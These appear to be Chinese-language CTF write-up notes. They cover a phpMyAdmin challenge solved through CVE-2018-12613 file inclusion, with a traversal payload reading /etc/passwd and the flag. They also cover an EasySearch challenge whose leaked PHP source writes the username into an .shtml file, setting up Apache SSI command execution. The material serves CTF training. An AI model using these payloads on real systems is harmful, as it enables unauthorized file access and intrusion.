# 信息搜集

# 信息搜集

### dirsearch

### ****[GWCTF 2019]我有一个数据库****

dirserarch扫一下

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled.png)

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%201.png)

访问phpmyadmin/index.php，拿到版本信息

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%202.png)

搜索对应版本漏洞

[cve-2018-12613-PhpMyadmin后台文件包含 - 简书 (jianshu.com)](https://www.jianshu.com/p/fb9c2ae16d09)

- 文件包含：index.php?target=db_datadict.php%253f/../../../../../../../../../etc/passwd

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%203.png)

index.php?target=db_datadict.php%253f/../../../../../../../../../flag

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%204.png)

### swp源码泄露

### **Apache SSI 远程命令执行**

### ****[BJDCTF2020]EasySearch****

swp源码泄露

```php
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>
```

在username那里写入文件内容，在响应报文那里会有文件位置

![Untitled](%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%20e31f7e5bf9664aed9d1e84c0455ed54c/Untitled%205.png)